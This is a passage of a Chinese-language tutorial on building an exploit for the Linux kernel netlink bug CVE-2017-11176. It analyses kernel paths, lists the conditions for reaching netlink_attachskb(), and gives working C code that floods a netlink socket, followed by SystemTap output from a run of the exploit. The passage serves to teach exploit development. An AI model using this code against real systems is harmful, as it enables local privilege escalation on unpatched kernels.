<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETLINK_CB(skb).pid   = nlk-&gt;pid;</span><br><span class="line">NETLINK_CB(skb).dst_group = dst_group;</span><br><span class="line"><span class="built_in">memcpy</span>(NETLINK_CREDS(skb), &amp;siocb-&gt;scm-&gt;creds, <span class="keyword">sizeof</span>(struct ucred));</span><br><span class="line">NETLINK_CB(skb).flags = netlink_skb_flags;</span><br></pre></td></tr></table></figure>

<p>接着：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">      err = -EFAULT;</span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (memcpy_fromiovec(skb_put(skb, len), msg-&gt;msg_iov, len)) &#123;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>[0]处同样没有任何问题因为我们已经提供了可读的iovec，除非__sys_sendmsg()调用失败。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]   err = security_netlink_send(sk, skb);</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>这是LSM的检查。如果我们不能通过这个检查，就需要寻找其它途径到达netlink_unicast()或者另一种增加sk_rmem_alloc的方法（例如尝试netlink_dump()）。我们假设我们通过了这个检查。</p>
<p>最后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (dst_group) &#123;</span><br><span class="line">        atomic_inc(&amp;skb-&gt;users);</span><br><span class="line">        netlink_broadcast(sk, skb, dst_pid, dst_group, GFP_KERNEL);</span><br><span class="line">      &#125;</span><br><span class="line">[<span class="number">1</span>]   err = netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT);</span><br></pre></td></tr></table></figure>

<p>记住dst_group被赋值为msg-&gt;msg_name-&gt;dst_group。既然我们强制让他为0，我们能够跳过[0]处并最终到达netlink_unicast()。</p>
<p>让我们总结一下从netlink_sendmsg()到达netlink_unicast()的条件：</p>
<ul>
<li><strong>msg-&gt;msg_flags</strong> doesn’t have the <em>MSG_OOB</em> flag</li>
<li><strong>msg-&gt;msg_controllen</strong> equals 0</li>
<li><strong>msg-&gt;msg_namelen</strong> is different from zero</li>
<li><strong>msg-&gt;msg_name-&gt;nl_family</strong> equals AF_NETLINK</li>
<li><strong>msg-&gt;msg_name-&gt;nl_groups</strong> equals 0</li>
<li><strong>msg-&gt;msg_name-&gt;nl_pid</strong> is different from 0 and points to the receiver socket</li>
<li>the sender netlink socket must use the <strong>NETLINK_USERSOCK</strong> protocol</li>
<li><strong>msg-&gt;msg_iovlen</strong> equals 1</li>
<li><strong>msg-&gt;msg_iov</strong> is a readable userland address</li>
<li><strong>msg-&gt;msg_iov-&gt;iov_len</strong> is lesser than or equals to sk_sndbuf minus 32</li>
<li><strong>msg-&gt;msg_iov-&gt;iov_base</strong> is a readable userland address</li>
</ul>
<p>我们在这里看到的是内核开发者的工作。分析每个检查，强制执行特定的内核路径，定制系统调用参数等。实际上，分析这些条件的时间并不长。有些路径比这更复杂。</p>
<p>让我们继续前进，研究如何到达netlink_attachskb()。</p>
<h4 id="Reach-netlink-attachskb-from-netlink-unicast"><a href="#Reach-netlink-attachskb-from-netlink-unicast" class="headerlink" title="Reach netlink_attachskb() from netlink_unicast()"></a>Reach netlink_attachskb() from netlink_unicast()</h4><p>netlink_unicast()有以下参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sk</strong> is our sender netlink_sock</li>
<li><strong>skb</strong> is a socket buffer filled with <em>msg-&gt;msg_iov-&gt;iov_base</em> data of size <em>msg-&gt;msg_iov-&gt;iov_len</em></li>
<li><strong>dst_pid</strong> is a controlled pid (<em>msg-&gt;msg_name-&gt;nl_pid</em>) pointing to our receiver netlink socket</li>
<li><strong>msg-&gt;msg_flasg&amp;MSG_DONTWAIT</strong> indicates if netlink_unicast() should block or not</li>
</ul>
<p><strong>WARNING</strong>: Inside the netlink_unicast() code <strong>“ssk” is the sender socket and “sk” the receiver</strong>.</p>
<p>netlink_unicast()：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_unicast</span><span class="params">(struct sock *ssk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">            u32 pid, <span class="keyword">int</span> nonblock)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line">      <span class="keyword">int</span> err;</span><br><span class="line">      <span class="keyword">long</span> timeo;</span><br><span class="line"></span><br><span class="line">      skb = netlink_trim(skb, gfp_any());   <span class="comment">// &lt;----- ignore this</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   timeo = sock_sndtimeo(ssk, nonblock);</span><br><span class="line">    retry:</span><br><span class="line">[<span class="number">1</span>]   sk = netlink_getsockbypid(ssk, pid);</span><br><span class="line">      <span class="keyword">if</span> (IS_ERR(sk)) &#123;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(sk);</span><br><span class="line">      &#125;</span><br><span class="line">[<span class="number">2</span>]   <span class="keyword">if</span> (netlink_is_kernel(sk))</span><br><span class="line">        <span class="keyword">return</span> netlink_unicast_kernel(sk, skb, ssk);</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]   <span class="keyword">if</span> (sk_filter(sk, skb)) &#123;</span><br><span class="line">        err = skb-&gt;len;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        sock_put(sk);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">4</span>]   err = netlink_attachskb(sk, skb, &amp;timeo, ssk);</span><br><span class="line">      <span class="keyword">if</span> (err == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">      <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]   <span class="keyword">return</span> netlink_sendskb(sk, skb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>[0]处，sock_sndtimeo()根据<em>nonblock</em>设置<strong>timeo</strong>(<em>timeout</em>)的值。因为我们不想阻塞（nonblock&gt;0），timeo将会是0。所以<strong>msg-&gt;msg_flags必须设置MSG_DONTWAIT标志</strong>。</p>
<p>[1]处，目标netlink_sock “sk”通过pid获取，正如我们将在下一节中看到的那样，在使用netlink_getsockbypid()检索之前，**需要绑定目标netlink_sock **。</p>
<p>[2]处，目标socket必须不是一个内核socket。一个netlink sock如果有<em>NETLINK_KERNEL_SOCKET</em>标志，它将被认为是内核的。这意味着它是通过netlink_kernel_create()函数创建的。不幸的是，NETLINK_GENERIC是他们的其中之一。所以我们<strong>也将receiver socket的协议更改为NETLINK_USERSOCK</strong>。请注意，receiver netlink_sock上有一个引用。（ Note that a reference is taken on receiver netlink_sock）</p>
<p>[3]处，可能会有BPF sock过滤器被应用，如果没有为receiver sock创建任何BPF过滤器，那么这里可以跳过。</p>
<p>It means that it has been created with the netlink_kernel_create() function. Unfortunately, the NETLINK_GENERIC is one of them (from current exploit). So let’s <strong>change the receiver socket protocol to NETLINK_USERSOCK</strong> as well. It also makes more sense by the way… Note that a reference is taken on receiver netlink_sock.</p>
<p>接着就是[4]处调用netlink_attachskb()！在netlink_attachskb()中，我们保证采用其中一条路径：</p>
<ol>
<li>the receiver buffer is not full: call skb_set_owner_r() -&gt; increase sk_rmem_alloc</li>
<li>the receiver buffer is full: netlink_attachskb() do not block and return -EAGAIN (timeout is zero)</li>
</ol>
<p>也就是说，我们有办法知道接收缓冲区何时已满（只需检查sendmsg()的错误代码）。</p>
<p>最后，[5]处调用netlink_sendskb()将skb添加到receiver buffer列表并删除netlink_getsockbypid()的引用。</p>
<p>条件限制：</p>
<ul>
<li><strong>msg-&gt;msg_flags</strong> has the MSG_DONTWAIT flag set</li>
<li>the receiver netlink socket must be bound prior calling sendmsg()</li>
<li>the receiver netlink socket must use the <strong>NETLINK_USERSOCK</strong> protocol</li>
<li>don’t define any BPF filter for the receiver socket</li>
</ul>
<p>我们现在非常接近最终的PoC，我们只需要绑定接收器套接字。</p>
<h4 id="Binding-the-receiver-socket"><a href="#Binding-the-receiver-socket" class="headerlink" title="Binding the receiver socket"></a>Binding the receiver socket</h4><p>与任何socket通信一样，两个socket可以使用“地址”进行通信。由于我们正在操作netlink socket，我们将使用struct sockaddr_nl类型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> &#123;</span></span><br><span class="line">   <span class="keyword">sa_family_t</span>     nl_family;  <span class="comment">/* AF_NETLINK */</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span>  nl_pad;     <span class="comment">/* Zero. */</span></span><br><span class="line">   <span class="keyword">pid_t</span>           nl_pid;     <span class="comment">/* Port ID. */</span></span><br><span class="line">   __u32           nl_groups;  <span class="comment">/* Multicast groups mask. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于我们不想成为broadcast group的一部分，因此nl_groups必须为零。这里唯一重要的字段是nl_pid。</p>
<p>基本上，**netlink_bind()**有两条路径：</p>
<ol>
<li>nl_pid is not zero: it calls <strong>netlink_insert()</strong></li>
<li>nl_pid is zero: it calls <strong>netlink_autobind()</strong>, which in turn calls netlink_insert()</li>
</ol>
<p>请注意，使用已使用的pid调用netlink_insert()将失败，并显示错误-EADDRINUSE。 否则，在nl_pid和netlink sock之间创建映射。也就是说，现在可以使用netlink_getsockbypid()检索netlink sock。<strong>此外，netlink_insert()将sock引用计数器增加1</strong>。请记住这件事情。</p>
<p>注意：第4部分将详细介绍netlink如何存储“pid:netlink_sock”映射。</p>
<p>虽然调用netlink_autobind()看起来更自然，但我们实际上是通过遍历pid值（这是autobind做的）直到bind()成功。直接设置nl_pid允许我们直接获取目标nl_pid值而不调用getsockname()，并且（可能）简化调试。</p>
<h4 id="Putting-It-All-Together"><a href="#Putting-It-All-Together" class="headerlink" title="Putting It All Together"></a>Putting It All Together</h4><p>分析所有这些路径都需要很长的时间，但是我们现在已经准备好在exploit中实施它并最终实现我们的目标：让<strong>netlink_attachskb()返回1</strong>。</p>
<p>一些策略：</p>
<ol>
<li>使用NETLINK_USERSOCK协议创建两个AF_NETLINK socket</li>
<li>绑定目标（receiver）socket（即必须使其接收缓冲区已满的socket）</li>
<li>[可选]尝试减少目标socket的接收缓冲区（减少对sendmsg()的调用）</li>
<li>通过sender socket中的*sendmsg()*填充目标socket，直到它返回EAGAIN</li>
<li>关闭sender socket（不再需要它了）</li>
</ol>
<p>你可以<em>独立</em>运行以下代码，以验证一切正常：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepare_blocking_socket</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> send_fd;</span><br><span class="line">  <span class="keyword">int</span> recv_fd;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>*<span class="number">10</span>]; <span class="comment">// should be less than (sk-&gt;sk_sndbuf - 32), you can use getsockopt()</span></span><br><span class="line">  <span class="keyword">int</span> new_size = <span class="number">0</span>; <span class="comment">// this will be reset to SOCK_MIN_RCVBUF</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">addr</span> = &#123;</span></span><br><span class="line">    .nl_family = AF_NETLINK,</span><br><span class="line">    .nl_pad = <span class="number">0</span>,</span><br><span class="line">    .nl_pid = <span class="number">118</span>, <span class="comment">// must different than zero</span></span><br><span class="line">    .nl_groups = <span class="number">0</span> <span class="comment">// no groups</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span></span><br><span class="line">    .iov_base = buf,</span><br><span class="line">    .iov_len = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">mhdr</span> = &#123;</span></span><br><span class="line">    .msg_name = &amp;addr,</span><br><span class="line">    .msg_namelen = <span class="keyword">sizeof</span>(addr),</span><br><span class="line">    .msg_iov = &amp;iov,</span><br><span class="line">    .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    .msg_control = <span class="literal">NULL</span>,</span><br><span class="line">    .msg_controllen = <span class="number">0</span>,</span><br><span class="line">    .msg_flags = <span class="number">0</span>, </span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] preparing blocking netlink socket\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span> ||</span><br><span class="line">      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] socket created (send_fd = %d, recv_fd = %d)\n&quot;</span>, send_fd, recv_fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// simulate netlink_autobind()</span></span><br><span class="line">  <span class="keyword">while</span> (_bind(recv_fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno != EADDRINUSE)</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] bind&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    addr.nl_pid++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink socket bound (nl_pid=%d)\n&quot;</span>, addr.nl_pid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &amp;new_size, <span class="keyword">sizeof</span>(new_size)))</span><br><span class="line">    perror(<span class="string">&quot;[-] setsockopt&quot;</span>); <span class="comment">// no worry if it fails, it is just an optim.</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] receive buffer reduced\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] flooding socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (_sendmsg(send_fd, &amp;mhdr, MSG_DONTWAIT) &gt; <span class="number">0</span>)  <span class="comment">// &lt;----- don&#x27;t forget MSG_DONTWAIT</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (errno != EAGAIN)  <span class="comment">// &lt;----- did we failed because the receive buffer is full ?</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sendmsg&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] flood completed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  _close(send_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] blocking socket ready\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> recv_fd;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to prepare block socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们来看一下System Tap的返回结果。<strong>从这里开始，System Tap仅用来观察内核且不修改任何数据</strong>。输出结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">sunichi@debian:/mnt/hgfs/Ubuntu For Debug/cve$ ./exploit</span><br><span class="line">[ ] -=&#123; CVE-2017-11176 Exploit &#125;=-</span><br><span class="line">[ ] preparing blocking netlink socket</span><br><span class="line">[+] socket created (send_fd = 3, recv_fd = 4)</span><br><span class="line">[+] netlink socket bound (nl_pid=118)</span><br><span class="line">[+] receive buffer reduced</span><br><span class="line">[ ] flooding socket</span><br><span class="line">[+] flood completed</span><br><span class="line">[+] blocking socket ready</span><br><span class="line">[+] netlink socket created = 4</span><br><span class="line">[+] netlink fd duplicated (unblock_fd=3, sock_fd2=5)</span><br><span class="line">[ ] creating unblock thread...</span><br><span class="line">[+] unblocking thread has been created!</span><br><span class="line">[ ] get ready to block</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7200)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8300)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c746d40)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0x0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c980500)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da100</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff880020c1e800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff880020c1e800</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e600</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e600</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e700</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96cb00 len=0x2800)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffffc9000821f000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96cb00 timeo=0xffff88003d8cfbd8 ssk=0xffff880037218800)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = 0</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e700</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x2800)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffffc90008223000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; 